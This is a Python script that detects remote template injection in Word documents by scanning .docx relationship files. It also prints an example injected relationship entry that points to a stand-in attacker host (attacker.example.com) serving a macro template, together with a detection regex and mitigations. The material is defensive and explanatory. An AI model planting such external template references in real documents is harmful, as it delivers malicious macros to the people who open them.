#!/usr/bin/env python3
"""
Template Injection Document Modifier
=====================================
DISCLAIMER: Educational purposes ONLY. Do not use without authorization.

This script demonstrates how Word document relationship files can be modified
to reference an external template (template injection technique).

This is for:
- Security researchers analyzing template injection
- Defenders building detection rules
- Red team simulation in authorized environments

How Template Injection Works:
1. Normal Word document references a .dotm template locally
2. Attacker modifies the document's relationship file to point to remote template
3. Word automatically fetches and loads the remote template on open
4. The remote template can contain malicious macros

PoC: Template would launch calc.exe (Windows Calculator)
"""

import zipfile
import os
import shutil
import sys
import tempfile


DISCLAIMER = """
╔══════════════════════════════════════════════════════════════════╗
║  EDUCATIONAL USE ONLY - AUTHORIZED TESTING ENVIRONMENTS ONLY    ║
║  Template injection detection and research tool                  ║
╚══════════════════════════════════════════════════════════════════╝
"""


def analyze_template_references(docx_path: str) -> list[dict]:
    """
    Analyze a Word document for external template references.
    
    This is a DEFENSIVE tool — checks if a document has been
    template-injected by analyzing its relationship files.
    
    Args:
        docx_path: Path to the .docx file to analyze
        
    Returns:
        List of external template references found
    """
    external_templates = []
    
    if not os.path.exists(docx_path):
        print(f"File not found: {docx_path}")
        return external_templates
    
    try:
        with zipfile.ZipFile(docx_path, 'r') as z:
            # Check all .rels files for external template references
            rels_files = [f for f in z.namelist() if f.endswith('.rels')]
            
            for rels_file in rels_files:
                content = z.read(rels_file).decode('utf-8', errors='ignore')
                
                # Look for external template relationships
                if 'attachedTemplate' in content and 'External' in content:
                    # Extract the target URL
                    import re
                    matches = re.findall(
                        r'Type="[^"]*attachedTemplate[^"]*"[^>]*Target="([^"]+)"[^>]*TargetMode="External"',
                        content
                    )
                    for match in matches:
                        external_templates.append({
                            'rels_file': rels_file,
                            'template_url': match,
                            'severity': 'HIGH' if match.startswith('http') else 'MEDIUM'
                        })
    except (zipfile.BadZipFile, KeyError) as e:
        print(f"Error analyzing document: {e}")
    
    return external_templates


def demonstrate_injection_concept(output_path: str = None) -> None:
    """
    Demonstrate the template injection concept by showing what a modified
    relationship file looks like.
    
    This shows the STRUCTURE of template injection for educational purposes,
    creating a sample .rels content string only (not a full malicious document).
    """
    print(DISCLAIMER)
    print("Template Injection — Relationship File Structure")
    print("=" * 50)
    
    # Normal template relationship (local)
    normal_rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" 
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings"
    Target="settings.xml"/>
  <!-- Normal: local template reference -->
  <Relationship Id="rId2"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
    Target="Normal.dotm" TargetMode="Internal"/>
</Relationships>'''

    # Injected template relationship (external)
    injected_rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" 
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings"
    Target="settings.xml"/>
  <!-- INJECTED: external template reference (attacker-controlled) -->
  <Relationship Id="rId2"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
    Target="http://attacker.example.com/malicious_template.dotm" 
    TargetMode="External"/>
</Relationships>'''

    print("\n[NORMAL] Document .rels with local template:")
    print(normal_rels)
    
    print("\n[INJECTED] Document .rels with external template (MALICIOUS):")
    print(injected_rels)
    
    print("\n" + "=" * 50)
    print("DETECTION YARA/REGEX RULE:")
    print("""
  Pattern: attachedTemplate.*TargetMode="External"
  
  This pattern in a Word document's .rels file indicates
  a remote template is being loaded on document open.
""")
    
    print("MITIGATION:")
    print("""
  1. Block network access from WINWORD.EXE
  2. Group Policy: Disable automatic template updates
  3. Network monitoring: Alert on WINWORD.EXE making outbound connections
  4. Tools to check: olevba, zipdump, YARA rules
""")


if __name__ == "__main__":
    print(DISCLAIMER)
    
    if len(sys.argv) == 2 and os.path.exists(sys.argv[1]):
        # Analyze mode: check a real document for template injection
        path = sys.argv[1]
        print(f"\nAnalyzing: {path}")
        results = analyze_template_references(path)
        
        if results:
            print(f"\n⚠️  TEMPLATE INJECTION DETECTED ({len(results)} external reference(s)):")
            for r in results:
                print(f"\n  Severity: {r['severity']}")
                print(f"  Relationship file: {r['rels_file']}")
                print(f"  Remote template URL: {r['template_url']}")
        else:
            print("\n✓  No external template references found.")
    else:
        # Demo mode: show the concept
        demonstrate_injection_concept()
        print("\nUsage:")
        print("  python template-inject.py              # Show concept demonstration")
        print("  python template-inject.py document.docx # Analyze document for injection")
